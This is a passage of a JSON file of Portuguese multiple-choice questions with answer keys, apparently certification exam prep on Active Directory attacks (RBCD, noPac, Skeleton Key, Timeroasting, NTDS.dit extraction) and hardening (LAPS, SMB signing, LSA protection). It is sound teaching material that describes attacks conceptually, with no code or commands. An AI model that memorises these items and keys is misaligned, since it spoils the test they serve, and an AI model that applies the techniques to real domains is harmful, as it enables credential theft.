      "Repor a password do KRBTGT em cada controlador de domínio para todos os tickets da floresta serem revogados e só o atacante conseguir pedir novos tickets",
      "Desativar a pré-autenticação Kerberos no alvo para o hash da password ser pedido offline e quebrado como numa vítima de AS-REP roasting",
      "Colocar um logon script no alvo via SYSVOL para o próximo domain admin que entrar executar o payload na sua própria sessão interativa",
      "Usar S4U2Self e S4U2Proxy a partir da conta controlada para obter um service ticket para o alvo como utilizador privilegiado e aceder como ele"
    ],
    "correct": 3,
    "explanation": "Com escrita no msDS-AllowedToActOnBehalfOfOtherIdentity, o atacante permite à sua conta de máquina delegar no alvo e usa S4U2Self/S4U2Proxy para se fazer passar por um utilizador privilegiado nesse host. Não repõe o KRBTGT, não desativa a pré-autenticação nem depende de scripts SYSVOL.",
    "difficulty": "Difícil",
    "exam": "cbrops",
    "topic": "identidade",
    "domain": "2.8"
  },
  {
    "question": "Numa rede Windows que não usa IPv6 ativamente, como é que um ataque do tipo mitm6 se coloca normalmente entre os clientes e a rede?",
    "options": [
      "Responde a pedidos DHCPv6 como servidor falso e dá aos clientes o atacante como servidor DNS, depois captura ou faz relay das autenticações",
      "Inunda a tabela CAM do switch com MACs IPv4 falsos para cada porto virar hub e o atacante poder escutar todo o tráfego da VLAN",
      "Faz brute-force ao controlador de domínio por SMBv1 até abrir uma null session e reescreve a tabela de rotas IPv6 em cada membro",
      "Envia BPDUs STP falsas com prioridade 0 para o portátil do atacante ser root bridge e todo o tráfego IPv6 passar pela sua própria interface de rede"
    ],
    "correct": 0,
    "explanation": "O Windows prefere IPv6 e pede DHCPv6 por omissão. O mitm6 responde como servidor DHCPv6 falso, define-se como DNS e depois captura ou faz relay de autenticações (por exemplo para LDAP). Mitiga-se bloqueando DHCPv6/RA falsos ou desativando IPv6 não usado e exigindo LDAP signing.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "ameacas",
    "domain": "2.5"
  },
  {
    "question": "Numa LAN Windows em que os anfitriões ainda fazem fallback para LLMNR ou NBT-NS na resolução de nomes, como funciona tipicamente um ataque ao estilo Responder?",
    "options": [
      "Altera o share SYSVOL do controlador de domínio para cada GPO enviar um endereço DNS falso, o que teria de ocorrer antes de qualquer resposta LLMNR ser aceite",
      "Desativa o Kerberos em todas as workstations através de chamadas WMI remotas, forçando toda a autenticação para Telnet em claro para as passwords aparecerem nas capturas",
      "Inunda pacotes Offer DHCP com um gateway por omissão rogue até o pool de leases do DHCP real esvaziar e todos os clientes perderem a conectividade IP na LAN",
      "Responde com LLMNR/NBT-NS falsos a nomes que falham no DNS e induz as vítimas a autenticarem-se ao atacante para capturar hashes ou fazer relay"
    ],
    "correct": 3,
    "explanation": "Ferramentas ao estilo Responder envenenam LLMNR/NBT-NS respondendo quando o DNS falha e depois capturam ou fazem relay da autenticação. Não precisam de alterar DNS via GPO no SYSVOL, desativar Kerberos nem de DHCP starvation como mecanismo central.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "ameacas",
    "domain": "2.5"
  },
  {
    "question": "No abuso de AD CS, o que combina principalmente o cenário ESC8 para obter um certificado no contexto de uma máquina ou utilizador privilegiado?",
    "options": [
      "Roubar a chave privada da CA de uma fita de backup offline e forjar certificados para sempre sem voltar a contactar o serviço web de enrollment em momento algum",
      "Fazer relay de autenticação NTLM para um endpoint HTTP de web enrollment da autoridade de certificação sem EPA, e pedir um certificado como a vítima",
      "Ativar delegação Kerberos não constrangida em todos os templates publicados da CA para qualquer workstation do domínio emitir tickets de domain admin sem certificado",
      "Substituir o certificado da CA raiz do domínio na Política de Grupo por um certificado TLS autoassinado para os browsers da intranet confiarem em sites de phishing"
    ],
    "correct": 1,
    "explanation": "O ESC8 abusa de relay NTLM para o web enrollment HTTP do AD CS quando faltam proteções como EPA, permitindo pedir um certificado no contexto da vítima retransmitida. Não é sobretudo roubo offline da chave da CA, delegação não constrangida em templates nem troca da CA raiz via GPO.",
    "difficulty": "Difícil",
    "exam": "scor",
    "topic": "cripto",
    "domain": "1.5"
  },
  {
    "question": "Depois de comprometer uma estação de trabalho, um atacante quer decifrar as passwords de browser guardadas e as chaves Wi-Fi do utilizador protegidas pelo DPAPI do Windows. Qual é uma abordagem realista?",
    "options": [
      "Basta ler os blobs cifrados e abri-los no Bloco de Notas, porque o DPAPI guarda todos os segredos em texto limpo e o cabeçalho de cifra é só uma etiqueta cosmética no ficheiro",
      "Obter a masterkey do utilizador (via a password/hash dele ou a chave de backup DPAPI do domínio) e usá-la para decifrar os blobs protegidos por DPAPI no contexto desse utilizador",
      "Reiniciar a máquina em modo de segurança, que a Microsoft documenta como a única forma suportada de qualquer processo remover de forma transparente a proteção DPAPI das credenciais guardadas",
      "Mudar a password do utilizador para um valor vazio, porque definir uma password vazia converte automaticamente cada blob DPAPI existente em disco numa cópia em texto limpo para todas as apps"
    ],
    "correct": 1,
    "explanation": "Os blobs DPAPI são cifrados com uma masterkey derivada das credenciais do utilizador; com a password/hash do utilizador ou a chave de backup do domínio, um atacante recupera a masterkey e decifra os segredos guardados. Os blobs não estão em texto limpo, e o modo de segurança ou limpar a password não removem o DPAPI.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "endpoint",
    "domain": "3.2"
  },
  {
    "question": "Com direitos de administrador num controlador de domínio, um atacante quer todos os hashes de password do domínio offline. Porquê usar uma Volume Shadow Copy (vssadmin/ntdsutil) para obter o NTDS.dit?",
    "options": [
      "Porque o NTDS.dit é guardado como um CSV não cifrado de passwords em texto limpo, por isso copiá-lo não precisa de shadow copy e qualquer utilizador o abre diretamente da pasta do sistema em uso",
      "Porque uma shadow copy desativa em silêncio a replicação do Active Directory para todos os outros controladores de domínio, o que é exigido antes de o Windows permitir ler o ficheiro da base",
      "Porque o NTDS.dit em uso está bloqueado pelo serviço de diretório, por isso uma shadow copy (ou ntdsutil IFM) dá uma cópia offline consistente da base e da hive SYSTEM para extrair os hashes",
      "Porque o vssadmin envia automaticamente o NTDS.dit para a cloud da Microsoft e manda os hashes decifrados por email ao operador, que é a única forma documentada de ler o ficheiro remotamente"
    ],
    "correct": 2,
    "explanation": "O NTDS.dit em uso está bloqueado pelo NTDS, por isso os atacantes usam uma Volume Shadow Copy ou ntdsutil IFM para obter uma cópia consistente da base mais a hive SYSTEM (boot key) e extrair hashes offline. O ficheiro é cifrado, não um CSV em texto limpo, e as shadow copies não desativam a replicação nem exfiltram para a cloud.",
    "difficulty": "Difícil",
    "exam": "cbrops",
    "topic": "identidade",
    "domain": "2.8"
  },
  {
    "question": "Um utilizador concluiu o MFA e tem uma sessão cloud ativa. Um atacante rouba o cookie de sessão do browser e reenvia-o. Porque é que isto pode contornar o MFA?",
    "options": [
      "Porque o cookie de sessão já representa uma sessão totalmente autenticada, por isso reenviar um cookie válido e não expirado deixa o atacante aproveitar a sessão sem refazer o MFA",
      "Porque roubar qualquer cookie revela de imediato a password em texto limpo do utilizador e o código de uso único atual, que o browser guarda sempre juntos dentro de cada cookie de sessão por desenho",
      "Porque os tokens de MFA só são verificados no primeiro login da vida do dispositivo, por isso nenhum serviço cloud volta a avaliar a autenticação depois de uma máquina ter entrado uma vez",
      "Porque os cookies de sessão desativam o TLS em todo o domínio, permitindo ao atacante ler todo o tráfego futuro em texto limpo e assim saltar os pedidos de multifator por completo"
    ],
    "correct": 0,
    "explanation": "Um cookie de sessão representa uma sessão já autenticada; reenviar um cookie válido e não expirado (pass-the-cookie) deixa o atacante reutilizar a sessão pós-MFA sem reautenticar. Os cookies não contêm a password em texto limpo nem o OTP, o MFA não é uma verificação única por vida, e os cookies não desativam o TLS.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "identidade",
    "domain": "6.7"
  },
  {
    "question": "Depois de obter execução de código como SYSTEM num controlador de domínio, um atacante quer que qualquer conta autentique com uma password mestra enquanto as passwords reais continuam a funcionar. Que técnica de persistência corresponde?",
    "options": [
      "Pass-the-hash só contra uma estação membro, porque reenviar um hash NTLM num portátil reescreve permanentemente todos os hashes de password do domínio guardados no Active Directory para o mesmo valor",
      "Kerberoasting de uma única conta de serviço, porque partir um bilhete TGS instala automaticamente uma password de backdoor que o Active Directory aceita para todos os utilizadores da floresta para sempre",
      "Skeleton Key: injectar um patch no LSASS do DC para o Kerberos (e muitas vezes o NTLM) aceitar uma password mestra escolhida para qualquer conta, enquanto as passwords legítimas continuam a funcionar",
      "AS-REP roasting sem pré-autenticação, porque recolher hashes AS-REP de utilizadores com UF_DONT_REQUIRE_PREAUTH é exactamente como se escreve uma password mestra universal no NTDS.dit"
    ],
    "correct": 2,
    "explanation": "O Skeleton Key faz patch ao LSASS num controlador de domínio para uma password mestra escolhida pelo atacante funcionar para qualquer conta a par das passwords reais. Pass-the-hash, Kerberoasting e AS-REP roasting não instalam esse backdoor de password dupla em todo o DC.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "identidade",
    "domain": "2.8"
  },
  {
    "question": "Um parque Windows reforçado aplica allowlisting de aplicações com WDAC (ou AppLocker). Porque é que binários living-off-the-land ainda podem enfraquecer esse controlo?",
    "options": [
      "Porque o WDAC e o AppLocker desactivam sempre todos os binários assinados pela Microsoft em disco, por isso os atacantes têm de trazer malware não assinado e o allowlisting não pode ser contornado por desenho sem excepções úteis",
      "Porque ferramentas de sistema assinadas e de confiança (LOLBins) que continuam permitidas podem ser abusadas para descarregar, descodificar ou lançar código, mantendo o atacante dentro da allowlist ao executar payloads",
      "Porque o allowlisting guarda cada hash bloqueado em texto limpo no registo, e ler essa lista remotamente remove a política de todas as máquinas juntas sem quaisquer direitos de administrador",
      "Porque activar o WDAC confia automaticamente em qualquer script ou binário obtido por HTTP através do proxy corporativo, que é o caminho de excepção documentado para aplicações de negócio"
    ],
    "correct": 1,
    "explanation": "O allowlisting permite binários conhecidos como bons; LOLBins que continuam de confiança ainda podem obter ou lançar código do atacante, por isso a defesa precisa de regras mais estritas e controlo de scripts. O WDAC não proíbe todos os binários Microsoft, não expõe uma lista de bypass em texto limpo nem confia automaticamente em downloads HTTP.",
    "difficulty": "Difícil",
    "exam": "scor",
    "topic": "endpoint",
    "domain": "5.1"
  },
  {
    "question": "Durante uma migração de floresta, uma conta mantém um SID antigo de elevado privilégio no SID History. Porque é isso perigoso através de uma trust entre florestas, e o que o mitiga?",
    "options": [
      "O SID History é só um nome de apresentação da conta e nunca é avaliado nos tokens de acesso, por isso manter SIDs antigos não pode conceder direitos na floresta que confia em qualquer configuração conhecida hoje",
      "O SID History obriga o Kerberos a desactivar AES e a cair para RC4 para sempre, que é o único impacto de segurança; o acesso a recursos no domínio que confia nunca é afectado por SIDs históricos de forma alguma",
      "O SID History é removido automaticamente em todas as autenticações em qualquer tipo de trust, por isso injectar um SID de Domain Admins no SID History nunca eleva o acesso noutra floresta",
      "Um SID privilegiado forjado ou retido no SID History pode ser acrescentado ao token do utilizador e conceder acesso na floresta que confia; o SID filtering (quarantine) na trust bloqueia esses SIDs estrangeiros"
    ],
    "correct": 3,
    "explanation": "O SID History pode transportar SIDs de grupos para o token de acesso; através de uma trust entre florestas isso pode elevar privilégios a menos que o SID filtering (quarantine) remova SIDs inesperados. Não é cosmético, não é só um downgrade de cifra, e não é sempre removido em todas as trusts.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "identidade",
    "domain": "6.1"
  },
  {
    "question": "Numa avaliação AD encontra Groups.xml no SYSVOL que ainda contém o atributo cpassword de Group Policy Preferences antigas. Porque é isso ainda útil para um atacante hoje?",
    "options": [
      "cpassword é um HMAC da versão do GPO e só prova que o ficheiro foi editado; nunca desencripta para uma credencial reutilizável com qualquer chave AES documentada da Microsoft publicada historicamente para essa funcionalidade",
      "A Microsoft publicou a chave AES estática usada para proteger passwords de GPP, por isso quem consegue ler o SYSVOL pode desencriptar o cpassword offline para credenciais em claro da conta definida",
      "cpassword cifra só o SID do Administrator local e não pode guardar passwords de utilizadores de domínio, por isso o achado limita-se a saber se o LAPS alguma vez esteve activo nessa OU nos últimos anos",
      "Os controladores de domínio modernos removem o cpassword em todas as replicações do SYSVOL, por isso um Groups.xml que ainda mostre o atributo é sempre um falso positivo de uma partilha de backup offline que os operadores esqueceram"
    ],
    "correct": 1,
    "explanation": "As GPP guardavam passwords com uma chave AES bem conhecida (era MS14-025). Valores cpassword legíveis no SYSVOL desencriptam offline para texto claro. Não é um mero HMAC, não se limita a um SID local, e os DC não removem automaticamente todas as cópias antigas.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "identidade",
    "domain": "3.2"
  },
  {
    "question": "Na cadeia de ataque noPac (CVE-2021-42278 / CVE-2021-42287) contra Active Directory, que combinação permite a um utilizador de baixo privilégio escalar rumo a direitos de domain admin?",
    "options": [
      "Forçar todos os DC a desactivar permanentemente a validação do PAC escrevendo um único valor de registo em HKLM, que qualquer utilizador autenticado pode definir remotamente via WinRM sem outros privilégios nos controladores de domínio",
      "Envenenar LLMNR para um DC autenticar no atacante e depois repetir essa resposta Net-NTLMv1 como Silver Ticket da conta krbtgt sem nunca tocar em contas de máquina no domínio Active Directory",
      "Explorar direitos de instalação de drivers de impressora PrintNightmare numa workstation e usar esse token SYSTEM local para fazer dump do LSASS num DC vizinho sobre ligações SMB sem signing no mesmo site",
      "Criar (ou renomear) uma conta de máquina cujo sAMAccountName corresponde ao nome de um DC sem o $ final, pedir um TGT e trocá-lo de forma que o PAC seja emitido como esse controlador de domínio"
    ],
    "correct": 3,
    "explanation": "O noPac encadeia spoofing de sAMAccountName (parecer um DC sem $) com o tratamento Kerberos de TGT/TGS para o PAC ser emitido pelo DC impersonado. Não é um flip simples de HKLM por qualquer utilizador, não é só LLMNR para Silver Ticket, e não é PrintNightmare numa workstation.",
    "difficulty": "Difícil",
    "exam": "cbrops",
    "topic": "identidade",
    "domain": "2.8"
  },
  {
    "question": "Um atacante obtém a password do Directory Services Restore Mode (DSRM) de um controlador de domínio. Em que situação essa credencial se torna especialmente perigosa para persistência ou abuso de recuperação?",
    "options": [
      "Quando o login DSRM é permitido como conta local de emergência num DC online (registo DsrmAdminLogonBehavior), a password actua como segredo de Administrator local que sobrevive a muitas rotações de passwords do domínio",
      "Quando a password DSRM é escrita na conta Administrator local de qualquer workstation membro, sincroniza automaticamente pelo SYSVOL e torna-se a password krbtgt do domínio no ciclo de replicação seguinte em todos os sites",
      "Quando o Azure AD Connect está instalado, o segredo DSRM é espelhado no tenant cloud como app password de Global Admin que não se pode rodar com ferramentas on-premises em qualquer topologia híbrida suportada hoje",
      "Quando o Credential Guard está activo, as credenciais DSRM são os únicos segredos ainda em claro no LSASS e por isso o alvo preferido de todas as ferramentas de dump nesse host durante uma captura forense offline"
    ],
    "correct": 0,
    "explanation": "O DSRM é o equivalente local ao Administrator no SAM do DC. Com DsrmAdminLogonBehavior a permitir logon com o AD DS a correr, é um segredo de emergência duradouro independente da rotação normal de contas de domínio. Não se torna krbtgt, não vira Global Admin Azure sozinho, e o Credential Guard não inventa essa propriedade.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "identidade",
    "domain": "2.8"
  },
  {
    "question": "Um principal no grupo DNSAdmins pode carregar uma DLL pelo caminho de plugin de nível de servidor do DNS Server. Porque é que isso é frequentemente tratado como caminho de elevação de privilégios até ao Domain Controller?",
    "options": [
      "Porque a pertença a DNSAdmins concede sozinha direitos de Domain Admin em todos os níveis funcionais da floresta, por isso o carregamento da DLL é só um evento de log cosmético e não é preciso para ganhar privilégio no DC",
      "Porque o caminho do plugin escreve uma tarefa agendada sob SYSTEM que corre uma vez no próximo reboot e depois remove o principal de DNSAdmins, sem deixar execução de código duradoura no servidor",
      "Porque carregar qualquer DLL no dns.exe exige SeDebugPrivilege que só Enterprise Admins têm, por isso DNSAdmins não consegue forçar o carregamento sem uma segunda conta privilegiada",
      "Porque o serviço Microsoft DNS Server corre muitas vezes como SYSTEM num DC, e uma DLL maliciosa de plugin de nível de servidor (por exemplo via serverlevelplugindll) executa código nesse contexto de alto privilégio"
    ],
    "correct": 3,
    "explanation": "Em muitos DCs o serviço DNS Server corre como SYSTEM. Membros de DNSAdmins podem configurar uma DLL de plugin de nível de servidor que o dns.exe carrega, obtendo execução SYSTEM e um caminho para Domain Admin. DNSAdmins não é Domain Admin por si; o risco é o contexto privilegiado do serviço, não um truque de tarefa agendada nem um portão SeDebugPrivilege que bloqueie por completo o DNSAdmins.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "identidade",
    "domain": "3.2"
  },
  {
    "question": "Numa avaliação AD queres a password actual de uma group Managed Service Account (gMSA). Que atributo / caminho de API se usa tipicamente para obter o blob da password gerida pelos principals autorizados?",
    "options": [
      "Ler msDS-ManagedPassword (via LDAP com os principals correctos em PrincipalsAllowedToRetrieveManagedPassword) devolve um blob que o cliente usa para derivar a password actual da gMSA",
      "Descarregar a password em claro do atributo userPassword no objecto da gMSA, que o Active Directory guarda sempre de forma reversível para todas as contas de serviço geridas por omissão",
      "Chamar NetUserGetInfo nível 3 contra o sAMAccountName da gMSA a partir de qualquer utilizador do domínio, porque as passwords gMSA são de propósito legíveis por Authenticated Users para checagens Kerberos de SPN",
      "Extrair a password do atributo UnicodePwd da gMSA por bind LDAP anónimo, o que o Windows permite especificamente para objectos msDS-GroupManagedServiceAccount"
    ],
    "correct": 0,
    "explanation": "As passwords gMSA obtêm-se pelos principals autorizados através do atributo construído msDS-ManagedPassword (muitas vezes via LDAP), não de um userPassword em claro legível por todos, não via NetUserGetInfo para qualquer utilizador do domínio, nem por binds anónimos a UnicodePwd. Quem está em PrincipalsAllowedToRetrieveManagedPassword (ou direitos equivalentes) controla quem recebe o blob.",
    "difficulty": "Difícil",
    "exam": "cbrops",
    "topic": "identidade",
    "domain": "2.8"
  },
  {
    "question": "Porque é que os guias de hardening pedem LDAP signing e LDAP channel binding nos domain controllers?",
    "options": [
      "Substituem por completo o Kerberos por NTLM nos binds à directory, o que simplifica o tratamento de tickets e remove a necessidade de rodar o krbtgt após suspeita de compromisso de um domain controller",
      "Obrigam todos os clientes LDAP a usar só LDAPS na porta 636, por isso o TCP/389 em claro fica firewallado e nenhum Simple bind sem assinatura chega à directory a partir da rede corporativa",
      "O signing protege a integridade do tráfego LDAP e o channel binding liga a sessão LDAP ao canal TLS, reduzindo riscos de relay e adulteração nos binds à directory (incluindo cenários StartTLS / LDAPS)",
      "Desactivam todos os Simple binds e as queries anónimas ao rootDSE, o que por si só impede a enumeração com BloodHound mesmo quando o avaliador já tem uma credencial válida de utilizador do domínio"
    ],
    "correct": 2,
    "explanation": "O LDAP signing garante a integridade das mensagens LDAP; o channel binding associa a troca LDAP ao canal TLS por baixo, tornando um bind retransmitido (relay) mais difícil. Não substituem Kerberos por NTLM, não firewallam sozinhos a 389 e não param sozinhos o BloodHound quando já existe credencial de utilizador.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "identidade",
    "domain": "2.3"
  },
  {
    "question": "Uma conta de administrador é adicionada ao grupo 'Protected Users' do Active Directory. Que efeito tem essa pertença?",
    "options": [
      "A conta fica isenta das políticas de expiração de palavra-passe e de bloqueio, para que os administradores de domínio nunca fiquem trancados durante um incidente ou um ataque de força bruta",
      "Ficam bloqueados para ela o NTLM, a pré-autenticação Kerberos com DES/RC4 e a delegação de credenciais, e os seus TGTs são curtos e não renováveis, o que limita o roubo e reuso",
      "O hash da palavra-passe é removido dos controladores de domínio, por isso a conta só entra com smart card e a replicação nunca copia as suas credenciais para outros DCs",
      "Todos os seus logons passam automaticamente por um jump server, por isso as sessões nunca chegam a postos de trabalho mesmo quando o utilizador escreve lá as credenciais"
    ],
    "correct": 1,
    "explanation": "O Protected Users endurece as contas membro: sem NTLM, sem DES nem RC4 na pré-autenticação Kerberos, sem delegação (constrained ou unconstrained), sem credenciais em claro em cache via CredSSP/WDigest, e um TGT de 4 horas não renovável. Não tira o bloqueio, não apaga hashes dos DCs nem força logons por jump server. Destina-se a contas de utilizador, não a contas de serviço ou de computador.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "identidade",
    "domain": "6.1"
  },
  {
    "question": "Num ataque 'Timeroasting', um atacante sem autenticação envia pedidos de hora MS-SNTP a um controlador de domínio. O que ganha, e quando é que isso é perigoso?",
    "options": [
      "O DC devolve a palavra-passe do krbtgt em claro dentro da resposta NTP, por isso qualquer host que chegue à UDP 123 forja Golden Tickets sem quebrar nada offline",
      "O DC acerta o relógio pelo desvio do pedido, por isso os tickets Kerberos do domínio expiram e os utilizadores caem para NTLM, que o atacante depois faz relay à vontade",
      "As respostas são assinadas com um MAC derivado do hash NT da conta de computador pedida, que pode ser quebrado offline quando essas palavras-passe são fracas ou manuais",
      "O DC revela na resposta a última hora de logon e o IP de origem de cada utilizador, dando ao atacante o mapa de sessões completo sem precisar de credenciais do domínio"
    ],
    "correct": 2,
    "explanation": "No MS-SNTP, o DC assina as respostas de hora com uma chave derivada do hash NT da conta de computador cujo RID vem no pedido. Um atacante pode pedir muitos RIDs sem se autenticar e quebrar os resultados offline. Atinge sobretudo contas de computador com palavras-passe fracas ou definidas à mão (por exemplo contas pré-criadas ou 'pre-Windows 2000'); as palavras-passe de máquina normais, rodadas automaticamente, são praticamente inquebráveis. Não revela o krbtgt, não muda o relógio do DC nem lista logons.",
    "difficulty": "Difícil",
    "exam": "cbrops",
    "topic": "identidade",
    "domain": "2.8"
  },
  {
    "question": "No modelo de administração por níveis (tiers) do Active Directory, qual é a regra central para as contas de administração Tier 0?",
    "options": [
      "Só fazem logon em activos Tier 0 (DCs, AD CS, servidores de sincronização de identidade), nunca em servidores ou postos de níveis abaixo, para não lhes roubarem as credenciais",
      "Têm de entrar em todos os postos de trabalho uma vez por semana para verificar patches, porque só as contas Tier 0 podem ler os registos de segurança locais dos endpoints",
      "São partilhadas por todo o help desk com uma só palavra-passe, para qualquer técnico repor utilizadores depressa e a auditoria ficar limitada a uma única identidade privilegiada",
      "Podem entrar em qualquer lado desde que tenham MFA, porque a MFA impede que os hashes e os tickets Kerberos fiquem na memória dos hosts de níveis inferiores"
    ],
    "correct": 0,
    "explanation": "O Tier 0 cobre o plano de controlo da identidade: controladores de domínio, AD CS, AD FS, servidores de sincronização e os seus administradores. Essas credenciais só se usam em sistemas Tier 0; entrar num servidor Tier 1 ou num posto Tier 2 deixa lá hashes ou tickets para um atacante roubar. O trabalho de rotina nos endpoints é para contas de nível inferior, contas de admin partilhadas destroem a responsabilização e a MFA no login não impede que as credenciais fiquem em memória.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "identidade",
    "domain": "1.9"
  },
  {
    "question": "Porque é que os guias de hardening do AD recomendam pôr o ms-DS-MachineAccountQuota a 0 no domínio?",
    "options": [
      "Porque uma quota acima de zero deixa todas as contas de computador fazer logon interativo nos DCs, o que as expõe ao roubo de credenciais por qualquer utilizador dessa máquina",
      "Porque a quota por omissão de 10 faz cada controlador de domínio replicar os objetos de computador dez vezes, o que atrasa os logons e deixa injetar dados de replicação falsos",
      "Por omissão qualquer utilizador autenticado pode juntar até 10 computadores, dando ao atacante uma conta de máquina que controla para ataques como abuso de RBCD ou noPac",
      "Porque uma quota acima de zero desliga o Kerberos nos computadores novos e obriga-os a usar NTLM, que os atacantes podem reencaminhar para o DC para obterem direitos de admin"
    ],
    "correct": 2,
    "explanation": "O ms-DS-MachineAccountQuota vem a 10 por omissão, por isso qualquer utilizador autenticado pode criar até 10 contas de computador. Uma conta de máquina controlada pelo atacante (com palavra-passe e SPN conhecidos) é um passo chave em ataques como abuso de resource-based constrained delegation, noPac e algumas cadeias de relay. Pô-lo a 0 e delegar a junção ao domínio num grupo próprio retira esse ponto de apoio. Não afeta o logon nos DCs, a replicação nem Kerberos versus NTLM.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "identidade",
    "domain": "2.5"
  },
  {
    "question": "Numa zona DNS integrada no AD, um atacante só com uma conta normal de utilizador do domínio cria um registo wildcard (*) que aponta para o seu IP. O que consegue com isso?",
    "options": [
      "Substitui os registos A de todos os controladores de domínio, por isso todos os pedidos de tickets Kerberos vão para o atacante, que pode emitir TGTs forjados para qualquer utilizador",
      "Os nomes sem registo passam a resolver para o atacante, por isso hostnames mal escritos ou antigos mandam-lhe tráfego e autenticação NTLM, como no envenenamento LLMNR",
      "Liga as transferências de zona DNS para o IP do atacante, que descarrega todos os registos da zona, mas nenhum tráfego dos clientes é desviado e nenhuma credencial é exposta",
      "Obriga todos os clientes a deixar de validar DNSSEC, por isso o atacante passa a responder por qualquer domínio público da Internet e a roubar certificados TLS desses sites"
    ],
    "correct": 1,
    "explanation": "Por omissão os utilizadores autenticados podem criar registos novos nas zonas DNS integradas no AD (ADIDNS). Um registo wildcard responde por qualquer nome que ainda não exista, por isso gralhas e hostnames desativados resolvem para o atacante, que pode capturar ou reencaminhar autenticação NTLM, como no envenenamento LLMNR/NBT-NS mas em todo o domínio. Os registos existentes, como os A dos DCs, não são substituídos, e transferências de zona e DNSSEC são definições à parte. Mitiga-se limitando a criação de registos e criando antecipadamente um registo wildcard.",
    "difficulty": "Difícil",
    "exam": "cbrops",
    "topic": "ameacas",
    "domain": "2.5"
  },
  {
    "question": "O que faz principalmente ativar a proteção LSA (RunAsPPL) num host Windows?",
    "options": [
      "Cifra a base de dados SAM com uma chave guardada no TPM, para que atacantes offline que copiem o disco não leiam os hashes locais sem a motherboard original",
      "Bloqueia toda a autenticação NTLM do host e obriga a Kerberos em todas as ligações, para as ferramentas de pass-the-hash falharem mesmo com admin local",
      "Move as credenciais de domínio em cache para uma máquina virtual isolada pelo hypervisor, para nem o código no kernel do host conseguir ler esses segredos",
      "Corre o LSASS como Protected Process Light, para nem admins locais lerem a sua memória ou carregarem plugins não assinados, travando dumps de credenciais"
    ],
    "correct": 3,
    "explanation": "A proteção LSA corre o lsass.exe como Protected Process Light (PPL). Processos não protegidos, mesmo com direitos de admin e SeDebugPrivilege, não o conseguem abrir para ler memória nem injetar código, e só carregam plugins LSA assinados, o que trava ferramentas como o sekurlsa do Mimikatz sem um driver de kernel. Isolar segredos numa VM protegida pelo hypervisor é o Credential Guard; não cifra a SAM com o TPM nem desliga o NTLM.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "endpoint",
    "domain": "5.1"
  },
  {
    "question": "Porque é que os guias de hardening pedem muitas vezes que o SMB signing seja obrigatório nos clientes e servidores Windows?",
    "options": [
      "Porque as sessões SMB assinadas encriptam todo o conteúdo dos ficheiros com uma chave AES por ligação, por isso cópias offline das partilhas não se leem depois sem também roubar o hash krbtgt do domínio",
      "Porque uma troca SMB assinada liga cada resposta à chave de sessão, por isso um atacante que reencaminhe autenticação NTLM capturada não consegue falar SMB útilmente como esse utilizador",
      "Porque o SMB signing substitui o NTLM por Kerberos em todos os acessos a partilhas por política, por isso o pass-the-hash contra contas locais deixa de funcionar só com esta alteração feita",
      "Porque a política de signing desliga sessões guest e null em todo o parque, que é a única forma prática de parar a enumeração anónima de partilhas e de utilizadores locais na rede"
    ],
    "correct": 1,
    "explanation": "O SMB signing usa a chave de sessão para proteger a integridade das mensagens SMB. Depois de um relay NTLM, o atacante não tem essa chave, por isso um servidor que exija signing rejeita a sessão SMB reencaminhada. Signing não é encriptação completa dos ficheiros, não substitui por si o NTLM por Kerberos e é independente de desligar sessões guest/null.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "rede-cloud",
    "domain": "2.3"
  },
  {
    "question": "O que consegue principalmente o Microsoft LAPS (Local Administrator Password Solution) nas máquinas Windows juntas ao domínio?",
    "options": [
      "Guarda uma única palavra-passe de admin local partilhada para toda a OU numa preferência de GPO, rodada mensalmente, para o helpdesk nunca precisar de uma conta de domínio para acesso de emergência a qualquer PC",
      "Desactiva por completo a conta Administrator local embutida e substitui-a por um gMSA cuja palavra-passe só é obtida do AD por principais com a permissão Enroll nessa conta de serviço",
      "Move os hashes de palavra-passe SAM locais para o Credential Guard, para nem admins de domínio com sessão interactiva no posto conseguirem despejar a palavra-passe do Administrator local com Mimikatz",
      "Define uma palavra-passe aleatória e única do Administrator local por máquina, guarda-a no AD e deixa só grupos delegados lê-la, acabando com admins locais partilhados"
    ],
    "correct": 3,
    "explanation": "O LAPS (e o Windows LAPS) dá a cada PC do domínio uma palavra-passe aleatória diferente para o Administrator local, guardada no Active Directory (ms-Mcs-AdmPwd ou os atributos novos do Windows LAPS) e legível só pelos grupos que delegares. Isso trava o movimento lateral que reutilizava uma palavra-passe de admin local em muitas máquinas. Não é uma palavra-passe única da OU numa GPO, não substitui o admin local por gMSA e não é o Credential Guard.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "endpoint",
    "domain": "5.2"
  },
  {
    "question": "Depois de um incidente com suspeita de golden ticket, porque é que os guias de recuperação pedem para repor a palavra-passe da conta krbtgt duas vezes, com replicação pelo meio?",
    "options": [
      "Porque os golden tickets usam as chaves krbtgt actual e anterior; duas reposições limpam as duas, e TGTs forjados com qualquer chave antiga falham a validação em todos os DC",
      "Porque a primeira reposição só marca o krbtgt para apagar e a segunda recria a conta, o que é preciso antes de a ownership do PDC emulator passar para um DC limpo",
      "Porque o Kerberos guarda o hash krbtgt no LSASS durante um ciclo de replicação; uma só reposição deixa o hash antigo em memória em todos os DC até reiniciares a máquina duas vezes",
      "Porque o AD guarda o histórico do krbtgt como três palavras-passe, e a Microsoft exige três reposições, mas os operadores param muitas vezes em duas quando não há RODC no domínio"
    ],
    "correct": 0,
